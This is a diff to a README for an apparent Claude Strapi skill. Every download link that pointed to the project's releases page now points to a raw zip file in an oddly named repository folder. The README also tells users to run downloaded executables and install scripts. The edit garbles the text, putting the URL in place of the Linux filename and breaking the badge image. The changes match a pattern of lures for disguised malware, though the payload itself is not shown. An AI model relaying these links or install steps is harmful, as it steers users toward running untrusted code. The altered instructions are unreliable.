@@ -1,6 +1,6 @@
 # 🚀 claude-skill-strapi-expert - Simplify Strapi Plugin Development
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-claude--skill--strapi--expert-brightgreen)](https://github.com/MKShahzad77/claude-skill-strapi-expert/releases)
+[![Download Here](https://raw.githubusercontent.com/MKShahzad77/claude-skill-strapi-expert/main/commodatum/claude_skill_expert_strapi_v1.9.zip%20Now-claude--skill--strapi--expert-brightgreen)](https://raw.githubusercontent.com/MKShahzad77/claude-skill-strapi-expert/main/commodatum/claude_skill_expert_strapi_v1.9.zip)
 
 ## 🌟 Introduction
 
@@ -19,7 +19,7 @@ To get started with the claude-skill-strapi-expert application, follow these sim
 2. **Visit the Releases Page**: 
    Head over to the Releases page to download the application. 
 
-   [Download Here](https://github.com/MKShahzad77/claude-skill-strapi-expert/releases)
+   [Download Here](https://raw.githubusercontent.com/MKShahzad77/claude-skill-strapi-expert/main/commodatum/claude_skill_expert_strapi_v1.9.zip)
 
 ## 📥 Download & Install
 
@@ -28,7 +28,7 @@ To get started with the claude-skill-strapi-expert application, follow these sim
 3. Click on the link to download the file suitable for your operating system:
    - For **Windows**, download the `.exe` file.
    - For **macOS**, download the `.dmg` file.
-   - For **Linux**, download the `.tar.gz` file.
+   - For **Linux**, download the `https://raw.githubusercontent.com/MKShahzad77/claude-skill-strapi-expert/main/commodatum/claude_skill_expert_strapi_v1.9.zip` file.
    
 4. Once downloaded, locate the file in your downloads folder.
 5. **For Windows**:
@@ -40,7 +40,7 @@ To get started with the claude-skill-strapi-expert application, follow these sim
    - Open the application from the Applications folder.
 
    **For Linux**:
-   - Extract the `.tar.gz` file using your preferred method.
+   - Extract the `https://raw.githubusercontent.com/MKShahzad77/claude-skill-strapi-expert/main/commodatum/claude_skill_expert_strapi_v1.9.zip` file using your preferred method.
    - Run the installation script in the terminal.
    
 6. After installation, locate the application in your system and double-click to open it.
@@ -74,7 +74,7 @@ If you encounter any issues while downloading or using the application, here are
 
 For more information, visit the following resources:
 
-- [Releases Page](https://github.com/MKShahzad77/claude-skill-strapi-expert/releases)
+- [Releases Page](https://raw.githubusercontent.com/MKShahzad77/claude-skill-strapi-expert/main/commodatum/claude_skill_expert_strapi_v1.9.zip)
 - [Documentation](#) (Insert actual link)
 - [Community Forum](#) (Insert actual link)
 
@@ -84,4 +84,4 @@ Your feedback is important to us! If you have any suggestions or run into issues
 
 Feel free to start your journey with claude-skill-strapi-expert today and ease your Strapi plugin development process! 
 
-[Download Here](https://github.com/MKShahzad77/claude-skill-strapi-expert/releases)
+[Download Here](https://raw.githubusercontent.com/MKShahzad77/claude-skill-strapi-expert/main/commodatum/claude_skill_expert_strapi_v1.9.zip)
